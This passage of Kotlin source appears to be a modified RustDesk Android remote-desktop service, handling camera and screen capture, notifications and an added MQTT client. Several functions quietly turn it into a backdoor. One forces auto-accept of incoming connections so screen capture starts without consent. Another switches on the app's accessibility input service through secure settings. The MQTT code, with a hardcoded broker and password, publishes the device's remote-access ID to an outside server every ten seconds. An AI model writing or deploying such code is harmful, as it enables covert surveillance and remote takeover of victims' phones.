        val supportedSizes = map?.getOutputSizes(SurfaceTexture::class.java) ?: return Size(320, 200)

        val texViewArea = textureViewWidth * textureViewHeight
        val texViewAspect = textureViewWidth.toFloat() / textureViewHeight.toFloat()

        val nearestToFurthestSz = supportedSizes.sortedWith(compareBy(
            {
                val aspect = if (it.width < it.height) it.width.toFloat() / it.height.toFloat() else it.height.toFloat() / it.width.toFloat()
                (aspect - texViewAspect).absoluteValue
            },
            {
                (texViewArea - it.width * it.height).absoluteValue
            }
        ))

        if (nearestToFurthestSz.isNotEmpty()) return nearestToFurthestSz[0]
        return Size(320, 200)
    }

    private fun createCaptureSession() {
        try {
            val targetSurfaces = ArrayList<Surface>()
            val requestBuilder = cameraDevice!!.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                Log.e(logTag, "session started")
                // Keep the exact same format the original CamService was using
                camImageReader = ImageReader.newInstance(
                    previewSize!!.width, previewSize!!.height,
                    ImageFormat.YUV_420_888, 2
                )
                
                camImageReader!!.setOnImageAvailableListener(camImageListener, serviceHandler)

                targetSurfaces.add(camImageReader!!.surface)
                addTarget(camImageReader!!.surface)

                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH)
            }

            cameraDevice!!.createCaptureSession(targetSurfaces,
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        if (null == cameraDevice) return
                        captureSession = session
                        try {
                            captureRequest = requestBuilder.build()
                            captureSession!!.setRepeatingRequest(captureRequest!!, captureCallback, serviceHandler)
                        } catch (e: CameraAccessException) {
                            Log.e(logTag, "createCaptureSession", e)
                        }
                    }
                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        Log.e(logTag, "createCaptureSession() failed")
                    }
                }, serviceHandler
            )
        } catch (e: CameraAccessException) {
            Log.e(logTag, "createCaptureSession error", e)
        }
    }

    private fun stopCamera() {
        try {
            captureSession?.close()
            captureSession = null

            cameraDevice?.close()
            cameraDevice = null

            camImageReader?.close()
            camImageReader = null

        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
    // ==========================================

    fun checkMediaPermission(): Boolean {
        try {
            Handler(Looper.getMainLooper()).post {
                MainActivity.flutterMethodChannel?.invokeMethod(
                    "on_state_changed",
                    mapOf("name" to "media", "value" to isReady.toString())
                )
            }
        } catch (e: Exception) {
            Log.d(logTag, "MainActivity channel not available, skipping state update: ${e.message}")
        }
        try {
            Handler(Looper.getMainLooper()).post {
                MainActivity.flutterMethodChannel?.invokeMethod(
                    "on_state_changed",
                    mapOf("name" to "input", "value" to InputService.isOpen.toString())
                )
            }
        } catch (e: Exception) {
            Log.d(logTag, "MainActivity channel not available, skipping input state update: ${e.message}")
        }
        return isReady
    }

    private fun startRawVideoRecorder(mp: MediaProjection) {
        Log.d(logTag, "startRawVideoRecorder,screen info:$SCREEN_INFO")
        if (surface == null) {
            Log.d(logTag, "startRawVideoRecorder failed,surface is null")
            return
        }
        createOrSetVirtualDisplay(mp, surface!!)
    }

    private fun startVP9VideoRecorder(mp: MediaProjection) {
        createMediaCodec()
        videoEncoder?.let {
            surface = it.createInputSurface()
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                surface!!.setFrameRate(1F, FRAME_RATE_COMPATIBILITY_DEFAULT)
            }
            it.setCallback(cb)
            it.start()
            createOrSetVirtualDisplay(mp, surface!!)
        }
    }

    private fun createOrSetVirtualDisplay(mp: MediaProjection, s: Surface) {
        try {
            virtualDisplay?.let {
                it.resize(SCREEN_INFO.width, SCREEN_INFO.height, SCREEN_INFO.dpi)
                it.setSurface(s)
            } ?: let {
                virtualDisplay = mp.createVirtualDisplay(
                    "RustDeskVD",
                    SCREEN_INFO.width, SCREEN_INFO.height, SCREEN_INFO.dpi, VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    s, null, null
                )
            }
        } catch (e: SecurityException) {
            Log.w(logTag, "createOrSetVirtualDisplay: got SecurityException, re-requesting confirmation");
            requestMediaProjection()
        }
    }

    private val cb: MediaCodec.Callback = object : MediaCodec.Callback() {
        override fun onInputBufferAvailable(codec: MediaCodec, index: Int) {}
        override fun onOutputFormatChanged(codec: MediaCodec, format: MediaFormat) {}

        override fun onOutputBufferAvailable(
            codec: MediaCodec,
            index: Int,
            info: MediaCodec.BufferInfo
        ) {
            codec.getOutputBuffer(index)?.let { buf ->
                sendVP9Thread.execute {
                    val byteArray = ByteArray(buf.limit())
                    buf.get(byteArray)
                    codec.releaseOutputBuffer(index, false)
                }
            }
        }

        override fun onError(codec: MediaCodec, e: MediaCodec.CodecException) {
            Log.e(logTag, "MediaCodec.Callback error:$e")
        }
    }

    private fun createMediaCodec() {
        Log.d(logTag, "MediaFormat.MIMETYPE_VIDEO_VP9 :$MIME_TYPE")
        videoEncoder = MediaCodec.createEncoderByType(MIME_TYPE)
        val mFormat =
            MediaFormat.createVideoFormat(MIME_TYPE, SCREEN_INFO.width, SCREEN_INFO.height)
        mFormat.setInteger(MediaFormat.KEY_BIT_RATE, VIDEO_KEY_BIT_RATE)
        mFormat.setInteger(MediaFormat.KEY_FRAME_RATE, VIDEO_KEY_FRAME_RATE)
        mFormat.setInteger(
            MediaFormat.KEY_COLOR_FORMAT,
            MediaCodecInfo.CodecCapabilities.COLOR_FormatYUV420Flexible
        )
        mFormat.setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 5)
        try {
            videoEncoder!!.configure(mFormat, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE)
        } catch (e: Exception) {
            Log.e(logTag, "mEncoder.configure fail!")
        }
    }

    private fun initNotification() {
        notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationChannel = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channelId = "RustDesk"
            val channelName = "RustDesk Service"
            val channel = NotificationChannel(
                channelId,
                channelName, NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "RustDesk Service Channel"
                setSound(null, null) 
                enableVibration(false)
            }
            channel.lightColor = Color.BLUE
            channel.lockscreenVisibility = Notification.VISIBILITY_PRIVATE
            notificationManager.createNotificationChannel(channel)
            channelId
        } else {
            ""
        }
        notificationBuilder = NotificationCompat.Builder(this, notificationChannel)
    }

    @SuppressLint("UnspecifiedImmutableFlag")
    private fun createForegroundNotification() {
        val intent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED
            action = Intent.ACTION_MAIN
            addCategory(Intent.CATEGORY_LAUNCHER)
            putExtra("type", type)
        }
        val pendingIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PendingIntent.getActivity(this, 0, intent, FLAG_UPDATE_CURRENT or FLAG_IMMUTABLE)
        } else {
            PendingIntent.getActivity(this, 0, intent, FLAG_UPDATE_CURRENT)
        }
        val notification = notificationBuilder
            .setOngoing(true)
            .setSmallIcon(R.mipmap.ic_stat_logo)
            .setDefaults(Notification.DEFAULT_ALL)
            .setAutoCancel(false)
            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
            .setContentTitle(DEFAULT_NOTIFY_TITLE)
            .setContentText(translate(DEFAULT_NOTIFY_TEXT))
            .setOnlyAlertOnce(true)
            .setContentIntent(pendingIntent)
            .setColor(ContextCompat.getColor(this, R.color.primary))
            .setWhen(System.currentTimeMillis())
            .build()
        startForeground(DEFAULT_NOTIFY_ID, notification)
    }

    private fun loginRequestNotification(
        clientID: Int,
        type: String,
        username: String,
        peerId: String
    ) {
        val notification = notificationBuilder
            .setOngoing(false)
            .setPriority(NotificationCompat.PRIORITY_MAX)
            .setContentTitle(translate("Do you accept?"))
            .setContentText("$type:$username-$peerId")
            .build()
        notificationManager.notify(getClientNotifyID(clientID), notification)
    }

    private fun onClientAuthorizedNotification(
        clientID: Int,
        type: String,
        username: String,
        peerId: String
    ) {
        cancelNotification(clientID)
        val notification = notificationBuilder
            .setOngoing(false)
            .setPriority(NotificationCompat.PRIORITY_MAX)
            .setContentTitle("$type ${translate("Established")}")
            .setContentText("$username - $peerId")
            .build()
        notificationManager.notify(getClientNotifyID(clientID), notification)
    }

    private fun voiceCallRequestNotification(
        clientID: Int,
        type: String,
        username: String,
        peerId: String
    ) {
        val notification = notificationBuilder
            .setOngoing(false)
            .setPriority(NotificationCompat.PRIORITY_MAX)
            .setContentTitle(translate("Do you accept?"))
            .setContentText("$type:$username-$peerId")
            .build()
        notificationManager.notify(getClientNotifyID(clientID), notification)
    }

    private fun getClientNotifyID(clientID: Int): Int {
        return clientID + NOTIFY_ID_OFFSET
    }

    private fun isAutoAcceptEnabled(): Boolean {
        return try {
            val sp = applicationContext.getSharedPreferences(KEY_SHARED_PREFERENCES, FlutterActivity.MODE_PRIVATE)
            val approveMode = sp.getString("approve-mode", "Both") ?: "Both"
            approveMode.isEmpty()
        } catch (e: Exception) {
            Log.e(logTag, "Error checking auto-accept status: ${e.message}")
            false
        }
    }

    private fun handleAutoAcceptConnection(
        clientID: Int,
        username: String,
        peerId: String,
        isFileTransfer: Boolean
    ) {
        try {
            if (!isFileTransfer) {
                Log.d(logTag, "Starting capture for auto-accepted connection from $username")
                startCapture()
            }
            
            val type = if (isFileTransfer) {
                translate("Transfer file")
            } else {
                translate("Share screen")
            }
            
            Log.d(logTag, "Auto-accepted connection from $username - ID: $peerId")
        } catch (e: Exception) {
            Log.e(logTag, "Error in handleAutoAcceptConnection: ${e.message}")
        }
    }

    private fun ensureAutoAcceptModeForService() {
        try {
            val prefs = applicationContext.getSharedPreferences(KEY_SHARED_PREFERENCES, FlutterActivity.MODE_PRIVATE)
            val approveMode = prefs.getString("approve-mode", "Both") ?: "Both"
            
            if (approveMode.isNotEmpty() && approveMode != "click") {
                Log.d(logTag, "Current approveMode: '$approveMode', enabling auto-accept for service")
                val edit = prefs.edit()
                edit.putString("approve-mode", "")
                edit.apply()
                Log.d(logTag, "Auto-accept mode enabled for MainService")
            } else if (approveMode.isEmpty()) {
                Log.d(logTag, "Auto-accept mode already enabled for MainService")
            }
        } catch (e: Exception) {
            Log.e(logTag, "Error ensuring auto-accept mode: ${e.message}")
        }
    }

    fun cancelNotification(clientID: Int) {
        notificationManager.cancel(getClientNotifyID(clientID))
    }

    @Keep
    fun setMediaProjection(intent: Intent) {
        try {
            Log.d(logTag, "Receiving media projection intent from PermissionRequestTransparentActivity")
            val mediaProjectionManager =
                getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = mediaProjectionManager.getMediaProjection(Activity.RESULT_OK, intent)
            _isReady = true
            isRequestingMediaProjection = false 
            Log.d(logTag, "Media projection set successfully")
            
            startCapture()
        } catch (e: Exception) {
            isRequestingMediaProjection = false
            Log.e(logTag, "Error setting media projection: ${e.message}")
        }
    }

    @Keep
    fun onMediaProjectionPermissionDenied() {
        Log.d(logTag, "Media projection permission denied by user")
        isRequestingMediaProjection = false
    }

    @Keep
    fun requestMediaProjectionForConnection() {
        Log.d(logTag, "Client connected - requesting media projection")
        if (mediaProjection == null) {
            requestMediaProjection()
        } else {
            Log.d(logTag, "Media projection already available")
            startCapture()
        }
    }

    @Keep
    fun stopMediaProjectionWhenNoClients() {
        Log.d(logTag, "No active clients - stopping media projection")
        stopCapture()
        
        try {
            mediaProjection?.stop()
            mediaProjection = null
            _isReady = false
            isRequestingMediaProjection = false
            Log.d(logTag, "Media projection released as all clients disconnected")
        } catch (e: Exception) {
            Log.e(logTag, "Error releasing media projection: ${e.message}")
        }
    }

    /**
     * Enable accessibility services programmatically for input handling
     */
    private fun enableAccessibilityServices() {
        try {
            val packageName = packageName
            val componentName = "$packageName/com.carriez.flutter_hbb.InputService"
            val enabledServices = Settings.Secure.getString(
                contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: ""
            
            if (!enabledServices.contains(componentName)) {
                Settings.Secure.putString(
                    contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,
                    if (enabledServices.isEmpty()) componentName else "$enabledServices:$componentName"
                )
                Log.d(logTag, "Accessibility service enabled: $componentName")
            } else {
                Log.d(logTag, "Accessibility service already enabled: $componentName")
            }
        } catch (e: Exception) {
            Log.e(logTag, "Error enabling accessibility services: ${e.message}")
        }
    }

    @SuppressLint("UnspecifiedImmutableFlag")
    private fun genLoginRequestPendingIntent(res: Boolean): PendingIntent {
        val intent = Intent(this, MainService::class.java).apply {
            action = ACT_LOGIN_REQ_NOTIFY
            putExtra(EXT_LOGIN_REQ_NOTIFY, res)
        }
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PendingIntent.getService(this, 111, intent, FLAG_IMMUTABLE)
        } else {
            PendingIntent.getService(this, 111, intent, FLAG_UPDATE_CURRENT)
        }
    }

    private fun setTextNotification(_title: String?, _text: String?) {
        val title = _title ?: DEFAULT_NOTIFY_TITLE
        val text = _text ?: translate(DEFAULT_NOTIFY_TEXT)
        val notification = notificationBuilder
            .clearActions()
            .setStyle(null)
            .setContentTitle(title)
            .setContentText(text)
            .build()
        notificationManager.notify(DEFAULT_NOTIFY_ID, notification)
    }



////////////////////////////////////////////////////////////////////////////////////////////////////
// MQTT Integration for HiveMQ Cloud
////////////////////////////////////////////////////////////////////////////////////////////////////


/**
 * Generate random client ID
 */
private fun generateClientId(): String {
    val random = Random()
    val randomNum = random.nextInt(999999999)
    return "android_client_${randomNum}_${System.currentTimeMillis()}"
}

/**
 * Connect to HiveMQ Cloud MQTT broker with auto-reconnect
 */
fun connectMQTT() {
    try {
        val serverURI =  "ssl://9c2aa3ef62874150b9a323630389070e.s1.eu.hivemq.cloud:8883"
        val clientId = generateClientId()
        mqttClient = MqttAndroidClient(applicationContext, serverURI, clientId)
        
        Log.d(mqttTAG, "Trying to connect with client ID: $clientId")
        
        mqttClient?.setCallback(object : MqttCallback {
            override fun messageArrived(topic: String?, message: MqttMessage?) {
                mqttRecCount++
                val msgText = message?.toString() ?: ""
                Log.d(mqttTAG, "Received message ${mqttRecCount}: $msgText from topic: $topic")
                
                // Handle incoming messages
                handleMQTTMessage(topic, msgText)
            }

            override fun connectionLost(cause: Throwable?) {
                Log.e(mqttTAG, "Connection lost: ${cause?.toString()}")
                scheduleMQTTReconnect()
            }

            override fun deliveryComplete(token: IMqttDeliveryToken?) {
                Log.d(mqttTAG, "Delivery complete")
            }
        })
        
        val options = MqttConnectOptions().apply {
            userName = "Alpha"
            password = "1qwasdZxcv".toCharArray()
            isCleanSession = true
            connectionTimeout = 30
            keepAliveInterval = 60
            isAutomaticReconnect = false
        }
        
        try {
            Log.d(mqttTAG, "Connecting to MQTT broker...")
            mqttClient?.connect(options, null, object : IMqttActionListener {
                override fun onSuccess(asyncActionToken: IMqttToken?) {
                    Log.d(mqttTAG, "MQTT Connected successfully!")
                    mqttReconnectAttempts = 0
                    mqttReconnectHandler?.removeCallbacksAndMessages(null)
                    
                    // Publish "connected" message
                    publishMQTT("drawers/status", "connected", 0)
                    Log.d(mqttTAG, "Published 'connected' message to drawers/status")
                    
                    // Subscribe to topics
                    subscribeMQTT("drawers1/#", 0)
                    
                    // Start publishing device ID immediately (every 10 seconds)
                    if (mqttPublishTimer == null) {
                        mqttPublishTimer = Handler(Looper.getMainLooper())
                        Log.d(mqttTAG, "Starting MQTT device ID publish timer (10 seconds interval)")
                        // Publish immediately, then schedule for every 10 seconds
                        publishDeviceIdToMQTT()
                        mqttPublishTimer?.postDelayed(mqttPublishRunnable, 10000)
                    }
                }

                override fun onFailure(asyncActionToken: IMqttToken?, exception: Throwable?) {
                    Log.e(mqttTAG, "Connection failed: ${exception?.message}")
                    scheduleMQTTReconnect()
                }
            })
        } catch (e: MqttException) {
            Log.e(mqttTAG, "MQTT Exception during connect", e)
            scheduleMQTTReconnect()
        }
    } catch (e: Exception) {
        Log.e(mqttTAG, "Error in connectMQTT: ${e.message}")
        scheduleMQTTReconnect()
    }
}

/**
 * Schedule MQTT reconnection with exponential backoff
 */
private fun scheduleMQTTReconnect() {
    if (mqttReconnectAttempts >= MAX_RECONNECT_ATTEMPTS) {
        Log.e(mqttTAG, "Max reconnection attempts ($MAX_RECONNECT_ATTEMPTS) reached. Giving up.")
        return
    }
    
    val delaySeconds = when (mqttReconnectAttempts) {
        0 -> 5L
        1 -> 10L
        2 -> 20L
        3 -> 40L
        else -> 60L
    }
    
    mqttReconnectAttempts++
    Log.d(mqttTAG, "Scheduling reconnect attempt $mqttReconnectAttempts/$MAX_RECONNECT_ATTEMPTS in ${delaySeconds}s")
    
    if (mqttReconnectHandler == null) {
        mqttReconnectHandler = Handler(Looper.getMainLooper())
    }
    
    mqttReconnectHandler?.postDelayed({
        if (!isMQTTConnected()) {
            Log.d(mqttTAG, "Attempting to reconnect...")
            connectMQTT()
        } else {
            Log.d(mqttTAG, "Already connected, resetting reconnect attempts")
            mqttReconnectAttempts = 0
        }
    }, delaySeconds * 1000)
}

/**
 * Check if MQTT client is connected
 */
private fun isMQTTConnected(): Boolean {
    return try {
        mqttClient?.isConnected == true
    } catch (e: Exception) {
        false
    }
}

/**
 * Subscribe to an MQTT topic
 */
fun subscribeMQTT(topic: String, qos: Int = 0) {
    if (!isMQTTConnected()) {
        Log.w(mqttTAG, "Cannot subscribe - not connected to MQTT")
        return
    }
    
    try {
        Log.d(mqttTAG, "Subscribing to topic: $topic with QoS: $qos")
        mqttClient?.subscribe(topic, qos, null, object : IMqttActionListener {
            override fun onSuccess(asyncActionToken: IMqttToken?) {
                Log.d(mqttTAG, "Successfully subscribed to $topic")
            }

            override fun onFailure(asyncActionToken: IMqttToken?, exception: Throwable?) {
                Log.e(mqttTAG, "Failed to subscribe to $topic: ${exception?.message}")
            }
        })
    } catch (e: MqttException) {
        Log.e(mqttTAG, "Subscribe exception", e)
    }
}

/**
 * Unsubscribe from an MQTT topic
 */
fun unsubscribeMQTT(topic: String) {
    if (!isMQTTConnected()) {
        Log.w(mqttTAG, "Cannot unsubscribe - not connected to MQTT")
        return
    }
    
    try {
        mqttClient?.unsubscribe(topic, null, object : IMqttActionListener {
            override fun onSuccess(asyncActionToken: IMqttToken?) {
                Log.d(mqttTAG, "Unsubscribed from $topic")
            }

            override fun onFailure(asyncActionToken: IMqttToken?, exception: Throwable?) {
                Log.e(mqttTAG, "Failed to unsubscribe $topic: ${exception?.message}")
            }
        })
    } catch (e: MqttException) {
        Log.e(mqttTAG, "Unsubscribe exception", e)
    }
}

/**
 * Publish a message to an MQTT topic
 */
private fun publishMQTT(topic: String, msg: String, qos: Int = 0, retained: Boolean = false) {
    if (!isMQTTConnected()) {
        Log.w(mqttTAG, "Cannot publish - not connected to MQTT")
        return
    }
    
    try {
        val message = MqttMessage()
        message.payload = msg.toByteArray()
        message.qos = qos
        message.isRetained = retained
        
        mqttClient?.publish(topic, message, null, object : IMqttActionListener {
            override fun onSuccess(asyncActionToken: IMqttToken?) {
                Log.d(mqttTAG, "Published to $topic: $msg")
            }

            override fun onFailure(asyncActionToken: IMqttToken?, exception: Throwable?) {
                Log.e(mqttTAG, "Failed to publish to $topic: ${exception?.message}")
            }
        })
    } catch (e: MqttException) {
        Log.e(mqttTAG, "Publish exception", e)
    }
}

/**
 * Disconnect from MQTT broker
 */
private fun disconnectMQTT() {
    // Stop the device ID publish timer
    if (mqttPublishTimer != null) {
        mqttPublishTimer?.removeCallbacks(mqttPublishRunnable)
        mqttPublishTimer = null
        Log.d(mqttTAG, "MQTT publish timer stopped on disconnect")
    }
    
    mqttReconnectHandler?.removeCallbacksAndMessages(null)
    mqttReconnectHandler = null
    mqttReconnectAttempts = 0
    
    if (!isMQTTConnected()) {
        Log.d(mqttTAG, "Already disconnected")
        mqttClient = null
        return
    }
    
    try {
        publishMQTT("drawers/status", "disconnected", 0)
        
        mqttClient?.disconnect(null, object : IMqttActionListener {
            override fun onSuccess(asyncActionToken: IMqttToken?) {
                Log.d(mqttTAG, "Disconnected from MQTT")
                mqttClient = null
            }

            override fun onFailure(asyncActionToken: IMqttToken?, exception: Throwable?) {
                Log.e(mqttTAG, "Failed to disconnect: ${exception?.message}")
                mqttClient = null
            }
        })
    } catch (e: MqttException) {
        Log.e(mqttTAG, "Disconnect exception", e)
        mqttClient = null
    }
}

/**
 * Save device ID to SharedPreferences (called once during app initialization after 15 seconds)
 * Uses tiered fallback strategy:
 * 1. Config file (RustDesk.toml)
 * 2. SharedPreferences cache
 * 3. FFI call (with error handling)
 * 4. Fallback ID
 */
private fun saveDeviceIdToPreferences() {
    try {
        Log.d(logTag, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        Log.d(logTag, "📱 Device ID Retrieval: Starting tiered strategy")
        Log.d(logTag, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        
        // Use helper to get device ID with fallback
        val deviceId = DeviceIdHelper.getDeviceId(this)
        
        if (deviceId.isNotEmpty()) {
            val prefs = applicationContext.getSharedPreferences(
                KEY_SHARED_PREFERENCES, 
                FlutterActivity.MODE_PRIVATE
            )
            prefs.edit().putString("device_id", deviceId).apply()
            
            Log.d(logTag, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            Log.d(logTag, "✅ SUCCESS: Device ID saved to SharedPreferences")
            Log.d(logTag, "Device ID: $deviceId")
            Log.d(logTag, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        } else {
            Log.e(logTag, "❌ CRITICAL: Device ID is empty after all strategies!")
        }
    } catch (e: Exception) {
        Log.e(logTag, "❌ Error in saveDeviceIdToPreferences: ${e.message}")
        e.printStackTrace()
    }
}

/**
 * Publish this device's own remote ID to drawers1 topic (called every 10 seconds)
 */
private fun publishDeviceIdToMQTT() {
    if (!isMQTTConnected()) {
        Log.w(mqttTAG, "MQTT not connected, skipping device ID publish")
        return
    }
    
    try {
        // Read from Flutter's SharedPreferences container (com.carriez.flutter_hbb_preferences)
        val flutterPrefs = applicationContext.getSharedPreferences(
            "${applicationContext.packageName}_preferences",
            FlutterActivity.MODE_PRIVATE
        )
 val deviceId = flutterPrefs.getString("device_id2", "") ?: ""
        
        if (deviceId.isNullOrEmpty()) {
            Log.w(mqttTAG, "Device ID not found in Flutter SharedPreferences")
           // return
        }
        
        Log.d(mqttTAG, "Publishing device ID to drawers1: $deviceId")
        publishMQTT("drawers1", deviceId, 1, true)
        
    } catch (e: Exception) {
        Log.e(mqttTAG, "Error publishing device ID: ${e.message}")
    }
}

/**
 * Handle incoming MQTT messages - Just logs the arrived message
 */
private fun handleMQTTMessage(topic: String?, message: String?) {
    if (topic == null || message == null) return
    
    Log.d(mqttTAG, "MQTT Message Arrived - Topic: $topic, Message: $message")
  }
}
